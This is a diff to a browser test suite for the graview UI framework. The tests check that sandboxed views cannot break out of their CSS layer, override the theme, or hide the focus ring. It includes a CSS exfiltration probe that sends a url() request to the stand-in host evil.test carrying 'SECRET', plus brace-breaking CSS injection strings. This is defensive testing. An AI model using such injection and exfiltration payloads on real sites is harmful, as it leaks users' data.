@@ -23,6 +23,16 @@
  *     jump says (`aria-current`).
  *   · And on the pages face, a titled view that says `heading: "own"` has
  *     nothing drawn above it: no title to see, no count, no list link.
+ *   · A view's controls already in their state — an "All" chip pressed
+ *     while nothing is filtered, the open tab — pass the press check run in
+ *     the page's own worker, and one that shows no state and changes
+ *     nothing still fails; and a view's cards laid in CSS columns are kept
+ *     whole in one (Roadmap f-view-authoring-friction-2026-11).
+ *   · Every sheet that tries to leave the layer it is drawn in, given as a
+ *     view's own and as the app's: nothing asks for the address in it, in
+ *     this engine, while a control of the same text left unjudged does; a
+ *     view's rule gets no way past the theme; and neither a view's plain rule
+ *     nor a style attribute takes the root's box, its fade or the ring.
  */
 import { createServer } from "node:http";
 import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
@@ -49,6 +59,42 @@ const draw = () => graview.render(graview.html\`<div class="agenda">
 </div>\`);
 graview.onProps(draw);
 `;
+
+/* Chips already in their state (Roadmap f-view-authoring-friction-2026-11): "All" pressed while nothing is filtered leaves the view as it is. */
+const CHIPS = `
+let filter = "all";
+const draw = () => graview.render(graview.html\`<div role="group" aria-label="Show">
+  <button id="all" aria-pressed="\${filter === "all" ? "true" : "false"}">All</button>
+  <button id="igneous" aria-pressed="\${filter === "igneous" ? "true" : "false"}">Igneous</button>
+</div>
+<button id="shuffle">Shuffle</button>\`);
+graview.onProps(() => draw());
+graview.on("click", "#all", () => { filter = "all"; draw(); });
+graview.on("click", "#igneous", () => { filter = "igneous"; draw(); });
+graview.on("click", "#shuffle", () => draw());
+`;
+
+/* Cards in CSS columns, each kept whole in one (Roadmap f-view-authoring-friction-2026-11). */
+const COLUMNS = `
+graview.style(\`
+.shelf { columns: 3; column-gap: 16px; column-rule: 1px solid var(--graview-edge); }
+.card { break-inside: avoid; margin: 0 0 12px; padding: 8px; border: 1px solid var(--graview-edge); }
+.shelf h2 { column-span: all; break-after: avoid; }
+\`);
+graview.onProps(() => graview.render(graview.html\`<div class="shelf"><h2>Specimens</h2>\${["Granite", "Gneiss", "Basalt", "Obsidian", "Chalk", "Slate"].map((name) => graview.html\`<article class="card" data-key="\${name}"><h3>\${name}</h3><p>A rock a child can hold.</p></article>\`)}</div>\`));
+`;
+
+/* What a view's plain rules and a style attribute try to do to what the host holds. */
+const ROOT_RULES = `
+graview.style("div{display:grid;color:rgb(9,9,9);font-family:monospace;line-height:9}*{display:inline;opacity:1;font-family:inherit;transition:none}#x{display:block;height:10px;margin:20px 0}");
+graview.onProps(() => graview.render(graview.html\`<p id="x">Margins held</p>\`));
+`;
+const RING = `
+graview.style("button{outline:none !important}#held{transition:outline-color 9999s,outline-width 9999s,outline-offset 9999s;outline-color:transparent}#accent{--graview-accent:transparent}#far{--graview-focus-offset:-9999px;--graview-focus-width:9999px}#out{--graview-focus-offset:9999px}#word{--graview-focus-width:red;--graview-focus-offset:red}#mine{--graview-focus-color:#0a7f3f}#clear{--graview-focus-color:transparent}");
+graview.onProps(() => graview.render(graview.html\`<button id="plain">Plain</button><button id="held">Held</button><button id="inline" style="outline:none !important;all:unset !important">Inline</button><button id="accent">Accent</button><button id="far">Far</button><button id="out">Out</button><button id="word">Word</button><button id="mine">Mine</button><button id="clear">Clear</button>\`));
+`;
+const DEAD_BESIDE = 'let clicks = 0; const draw = () => graview.render(graview.html`<div><button id="save" aria-pressed="true">Save</button><button id="cancel" aria-pressed="false">Cancel</button></div><p>${clicks}</p>`); graview.onProps(() => draw()); graview.on("click", "#save", () => draw()); graview.on("click", "#cancel", () => { clicks += 1; draw(); });';
+const DEAD_SAVE = 'const draw = () => graview.render(graview.html`<button id="save" aria-pressed="true">Save changes</button>`); graview.onProps(() => draw()); graview.on("click", "#save", () => draw());';
 
 export async function pressesSuite({ repoRoot, build, browser, claim, report, HOST, HOST_PORT, viewScript }) {
   const fixture = resolve(repoRoot, "scripts/fixtures/placement-app.ts");
@@ -113,15 +159,23 @@ graview.on("acted", "button", (event) => { said = event.pressed.ok ? "Saved" : "
 const draw = () => graview.render(graview.html\`<fieldset data-record="\${graview.props.node.id}"><input name="fixedFee"><button id="go" data-act="set-economics">Save economics</button><p id="said" data-key="said">\${said}</p></fieldset>\`);
 graview.onProps(draw);`,
     agenda: AGENDA,
+    chips: CHIPS,
+    columns: COLUMNS,
+    rootrules: ROOT_RULES,
+    ring: RING,
   };
-  const records = { economics: "placement:omar", contract: "placement:rhea", zero: "placement:omar", refused: "placement:omar", owned: "placement:omar", agenda: "placement:rhea" };
+  const records = { economics: "placement:omar", contract: "placement:rhea", zero: "placement:omar", refused: "placement:omar", owned: "placement:omar", agenda: "placement:rhea", chips: "placement:rhea", columns: "placement:rhea", rootrules: "placement:rhea", ring: "placement:rhea" };
   const scripts = Object.fromEntries(await Promise.all(Object.entries(codes).map(async ([name, code]) => [name, await viewScript(code)])));
   await build({
     stdin: {
       contents: `
 import { Store } from "@graview/core";
 import { mountWorkerView } from "@graview/guest/host/worker";
+import { runWorkerViewHeadless } from "@graview/guest/headless";
+import { checkPresses } from "@graview/guest/headless/presses";
+import { browserIsolate } from ${JSON.stringify(resolve(repoRoot, "packages/guest/src/headless/browser.ts"))};
 import { ECONOMICS_MANIFEST, kit, placementApp, placementSeed } from ${JSON.stringify(fixture)};
+import { LEAVING } from ${JSON.stringify(resolve(repoRoot, "scripts/fixtures/sheets-that-try-to-leave-their-layer.mjs"))};
 const store = new Store({ schema: placementApp.schema, mutations: placementApp.mutations, policy: placementApp.policy, snapshot: structuredClone(placementSeed) });
 const records = ${JSON.stringify(records)};
 const failures = [];
@@ -132,12 +186,44 @@ for (const [name, script] of Object.entries(window.VIEWS)) {
   document.querySelector("main").appendChild(holder);
   mountWorkerView(holder, { manifest: { ...ECONOMICS_MANIFEST, name }, worker: { script }, store, principal: kit, input: () => ({ node: { id: records[name] } }), onFailure: (reason, detail) => failures.push([name, reason, detail]), onProblem: (said) => problems.push([name, said]) });
 }
+/* Each sheet that tries to leave its layer, as the view's own and as the app's own for every view. */
+const leaving = LEAVING.map(({ name, css }, at) => {
+  const holder = document.createElement("section");
+  holder.dataset.leaving = String(at);
+  document.querySelector("main").appendChild(holder);
+  const source = "graview.style(" + JSON.stringify(css) + ");graview.onProps(() => graview.render(graview.html\`<div class='m'><b>Probe</b><button>Press</button></div>\`));";
+  return { name, view: mountWorkerView(holder, { manifest: { ...ECONOMICS_MANIFEST, name: "leaving-" + at }, worker: { source }, store, principal: kit, input: () => ({ node: { id: "placement:rhea" } }), brand: () => ({ name: "Placements", views: { css } }) }) };
+});
+/* The view's rule, tried past a theme that styles the same element. */
+const pastHolder = document.createElement("section");
+pastHolder.id = "past";
+document.querySelector("main").appendChild(pastHolder);
+mountWorkerView(pastHolder, { manifest: { ...ECONOMICS_MANIFEST, name: "past" }, worker: { source: "graview.style('}b{color:rgb(9,9,9)}');graview.onProps(() => graview.render(graview.html\`<b>Probe</b>\`));" }, store, principal: kit, input: () => ({ node: { id: "placement:rhea" } }), brand: () => ({ name: "Placements", views: { css: "b { color: rgb(200, 30, 30) }" } }) });
 window.__host = {
+  leaving: () => leaving.map(({ name, view }) => ({ name, drawn: view.shadow.querySelector(".m") !== null, refused: view.refused.length, sheet: view.shadow.querySelector("[data-graview-view-style]")?.textContent ?? "", theme: view.shadow.querySelector("[data-graview-view-theme]")?.textContent ?? "", color: view.shadow.querySelector("b") ? getComputedStyle(view.shadow.querySelector("b")).color : null })),
+  /* The control: the first sheet's text as the judges kept it before they refused it, in a layer of its own, proves this engine would ask. */
+  control: () => {
+    const holder = document.createElement("section");
+    document.querySelector("main").appendChild(holder);
+    const shadow = holder.attachShadow({ mode: "open" });
+    const style = document.createElement("style");
+    style.textContent = '@layer probe { @media } div { background-image: url("https://evil.test/control?d=SECRET"); z { } } }';
+    const root = document.createElement("div");
+    root.textContent = "Control";
+    shadow.append(style, root);
+  },
   failures,
   problems,
   log: () => store.log.all().map((op) => ({ author: op.author.id, via: op.via, intent: op.intent })),
   node: (id) => ({ ...store.graph.getNode(id) }),
+  /* The press check, run in this page's own worker as Better UI's is: what each control did. */
+  pressCheck: async (source) => {
+    const checked = new Store({ schema: placementApp.schema, mutations: placementApp.mutations, policy: placementApp.policy, snapshot: structuredClone(placementSeed) });
+    const result = await runWorkerViewHeadless({ manifest: ECONOMICS_MANIFEST, source, store: checked, principal: kit, run: browserIsolate(), input: { node: { id: "placement:rhea" } }, presses: checkPresses });
+    return result.ok ? { ok: result.presses.ok, controls: result.presses.controls.map((one) => [one.control, one.ok, one.says]) } : { failed: result.reason, detail: result.detail };
+  },
 };
+window.__sources = ${JSON.stringify({ chips: CHIPS, dead: DEAD_SAVE, deadBeside: DEAD_BESIDE })};
 `,
       resolveDir: repoRoot,
       loader: "js",
@@ -219,11 +305,108 @@ window.__handle.drawn().then(() => { window.__ready = true; });
 
   try {
     const context = await browser.newContext({ viewport: { width: 1024, height: 800 }, colorScheme: "light", acceptDownloads: true });
+    /* Every request for the attacker's address, from anywhere in this context, recorded and refused. */
+    const leaked = [];
+    await context.route("https://evil.test/**", (route) => {
+      leaked.push(route.request().url());
+      return route.abort();
+    });
     const tab = await context.newPage();
     tab.on("pageerror", (error) => report.pageErrors.push(String(error).slice(0, 200)));
     await tab.goto(`${HOST}/views/`, { waitUntil: "load" });
     const inView = (name, selector) => tab.locator(`#${name} [data-worker-view]`).locator(selector);
-    for (const name of Object.keys(codes)) await inView(name, name === "agenda" ? "#s5" : name === "contract" ? "#view-contract" : "button").first().waitFor({ timeout: 20_000 });
+    for (const name of Object.keys(codes)) await inView(name, name === "agenda" ? "#s5" : name === "contract" ? "#view-contract" : name === "columns" ? ".card" : name === "rootrules" ? "#x" : "button").first().waitFor({ timeout: 20_000 });
+
+    // Sheets that try to leave the layer they are drawn in (Roadmap f-view-authoring-friction-2026-11).
+    await tab.waitForFunction(() => window.__host.leaving().every((one) => one.drawn), null, { timeout: 30_000 });
+    await tab.waitForTimeout(500);
+    const sheets = await tab.evaluate(() => window.__host.leaving());
+    claim(`no sheet that tries to leave its layer asks for anything in this engine: ${sheets.length} sheets, each as the view's own and as the app's`, leaked.length === 0, { leaked });
+    claim("and each is said as refused, with no address and no host layer left in what is drawn", sheets.every((one) => one.refused > 0 && !/evil\.test|graview-motion/.test(one.sheet + one.theme)), sheets.filter((one) => one.refused === 0 || /evil\.test|graview-motion/.test(one.sheet + one.theme)));
+    await tab.evaluate(() => window.__host.control());
+    await tab.waitForFunction(() => true);
+    for (let i = 0; i < 40 && leaked.length === 0; i += 1) await tab.waitForTimeout(50);
+    claim("and the same text left unjudged in a layer does ask for it here, so this engine would have shown a leak", leaked.length >= 1 && leaked.every((url) => url === "https://evil.test/control?d=SECRET"), { leaked });
+    const past = await tab.evaluate(() => getComputedStyle(document.querySelector("#past [data-worker-view]").shadowRoot.querySelector("b")).color);
+    claim("a view's }b{color:rgb(9,9,9)} gets no rule past the theme: the element stays the theme's color", past === "rgb(200, 30, 30)", { past });
+
+    // A view's plain rules against the root it is drawn under.
+    const rooted = await tab.evaluate(() => {
+      const root = document.querySelector("#rootrules [data-worker-view]").shadowRoot.querySelector("[data-graview-view-root]");
+      root.setAttribute("data-graview-fade", "");
+      const faded = getComputedStyle(root).opacity;
+      root.removeAttribute("data-graview-fade");
+      root.setAttribute("data-graview-motion", "fade");
+      const fades = getComputedStyle(root).transitionDuration;
+      root.removeAttribute("data-graview-motion");
+      const region = root.getRootNode().host;
+      const child = root.querySelector("#x");
+      return { display: getComputedStyle(root).display, faded, height: root.getBoundingClientRect().height, fades, color: getComputedStyle(root).color, regionColor: getComputedStyle(region).color, font: getComputedStyle(child).fontFamily, regionFont: getComputedStyle(region).fontFamily, lineHeight: getComputedStyle(root).lineHeight, regionLineHeight: getComputedStyle(region).lineHeight };
+    });
+    claim("a view's div{display:grid} and *{display:inline} leave its root a flow-root that holds its child's margins", rooted.display === "flow-root" && rooted.height >= 50, rooted);
+    claim("and its *{opacity:1} does not hold the root in sight through a fade", rooted.faded === "0", rooted);
+    claim("and its div{color;font-family;line-height} and *{font-family:inherit} leave the root's type the region's", rooted.color === rooted.regionColor && rooted.color !== "rgb(9, 9, 9)" && rooted.font === rooted.regionFont && rooted.lineHeight === rooted.regionLineHeight, rooted);
+    claim("and its *{transition:none} does not make the fade a jump", rooted.fades.startsWith("0.18"), rooted);
+
+    // The ring, against a sheet's !important, a style attribute's, and a transition that would hold it at where it began.
+    const ringOf = async (id) => {
+      await inView("ring", `#${id}`).focus();
+      const engine = browser.browserType().name();
+      await tab.keyboard.press(engine === "webkit" ? "Alt+Shift+Tab" : "Shift+Tab");
+      await tab.keyboard.press(engine === "webkit" ? "Alt+Tab" : "Tab");
+      return tab.evaluate((id) => {
+        const button = document.querySelector("#ring [data-worker-view]").shadowRoot.querySelector("#" + id);
+        const style = getComputedStyle(button);
+        return { visible: button.matches(":focus-visible"), style: style.outlineStyle, width: parseFloat(style.outlineWidth), offset: parseFloat(style.outlineOffset), color: style.outlineColor };
+      }, id);
+    };
+    const rings = { plain: await ringOf("plain"), held: await ringOf("held"), inline: await ringOf("inline"), accent: await ringOf("accent"), far: await ringOf("far"), out: await ringOf("out"), word: await ringOf("word"), mine: await ringOf("mine"), clear: await ringOf("clear") };
+    const ringed = (one) => one.visible && one.style === "solid" && one.width >= 2 && one.color !== "rgba(0, 0, 0, 0)" && one.color !== "transparent";
+    claim("the ring stands against a view's outline:none !important in its sheet", ringed(rings.plain), rings);
+    claim("and against a transition that would hold it at a transparent start", ringed(rings.held), rings);
+    claim("and against outline:none !important and all:unset !important in a style attribute", ringed(rings.inline), rings);
+    claim("and against a view's own --graview-accent:transparent: its color is settled on the region", ringed(rings.accent) && rings.accent.color === rings.plain.color, rings);
+    claim("and its width and offset are held: a width of 9999px comes to 8px, and an offset of 9999px either way to no more than 8px (WebKit draws a ring at the edge inside the control)", ringed(rings.far) && rings.far.width === 8 && Math.abs(rings.far.offset) <= 8 && Math.abs(rings.out.offset) <= 8, rings);
+    claim("and a width and an offset that are no length leave the ring standing", ringed(rings.word), rings);
+    claim("a view restyles the ring with a plain --graview-focus-color, and transparent is refused, so that ring is the app's", rings.mine.color === "rgb(10, 127, 63)" && ringed(rings.clear) && rings.clear.color === rings.plain.color, rings);
+
+    // Controls already in their state, pressed by the check in this page's own worker (Roadmap f-view-authoring-friction-2026-11).
+    const chips = await tab.evaluate(() => window.__host.pressCheck(window.__sources.chips));
+    const chip = (name) => chips.controls?.find(([control]) => control === name);
+    claim(
+      "the press check, run in the page's own worker, passes an “All” chip pressed while nothing is filtered: it is already in the state it shows (aria-pressed=\"true\")",
+      chip("“All”")?.[1] === true && /already in the state it shows \(aria-pressed="true"\)/.test(chip("“All”")?.[2] ?? "") && chip("“Igneous”")?.[1] === true,
+      chips,
+    );
+    claim("and still fails a control that shows no state and changes nothing when pressed: “Shuffle” does nothing", chips.ok === false && chip("“Shuffle”")?.[1] === false && /does nothing when pressed/.test(chip("“Shuffle”")?.[2] ?? ""), chips);
+    await inView("chips", "#all").click();
+    await tab.waitForTimeout(300);
+    const dead = await tab.evaluate(() => window.__host.pressCheck(window.__sources.dead));
+    const beside = await tab.evaluate(() => window.__host.pressCheck(window.__sources.deadBeside));
+    const saveBeside = beside.controls?.find(([control]) => control === "“Save”");
+    claim("and fails a dead Save beside a working Cancel: pressing Cancel never takes its state", beside.ok === false && saveBeside?.[1] === false, beside);
+    claim("and fails a Save with a dead handler that says aria-pressed=\"true\": a state alone does not excuse it", dead.ok === false && /Save changes/.test(dead.controls?.[0]?.[0] ?? "") && dead.controls?.[0]?.[1] === false, dead);
+    claim("pressed on the page, “All” leaves the view as it is and nothing is said of it", (await tab.evaluate(() => window.__host.problems.filter(([name]) => name === "chips").length)) === 0 && (await inView("chips", "#all").getAttribute("aria-pressed")) === "true");
+
+    // Cards in CSS columns (Roadmap f-view-authoring-friction-2026-11).
+    const columns = await tab.evaluate(() => {
+      const root = document.querySelector("#columns [data-worker-view]").shadowRoot;
+      const shelf = root.querySelector(".shelf");
+      const cards = [...root.querySelectorAll(".card")];
+      const lefts = [...new Set(cards.map((card) => Math.round(card.getBoundingClientRect().left)))];
+      return {
+        sheet: root.querySelector("style[data-graview-view-style]").textContent,
+        columnCount: getComputedStyle(shelf).columnCount,
+        breakInside: getComputedStyle(cards[0]).breakInside,
+        columns: lefts.length,
+        whole: cards.every((card) => card.getClientRects().length === 1),
+      };
+    });
+    claim(
+      "a view's cards laid in CSS columns are drawn in three columns, each card kept whole in one: columns, column-gap, column-rule, column-span and break-inside are the open kit's",
+      columns.columnCount === "3" && columns.breakInside === "avoid" && columns.columns === 3 && columns.whole && /break-inside: avoid/.test(columns.sheet) && /column-span: all/.test(columns.sheet),
+      { ...columns, sheet: columns.sheet.slice(0, 300) },
+    );
 
     // A blank number left out, the press landing.
     await tab.waitForFunction(() => document.querySelector("#economics [data-worker-view]")?.shadowRoot?.querySelector('input[name="fixedFee"]')?.value === "4000", null, { timeout: 10_000 });
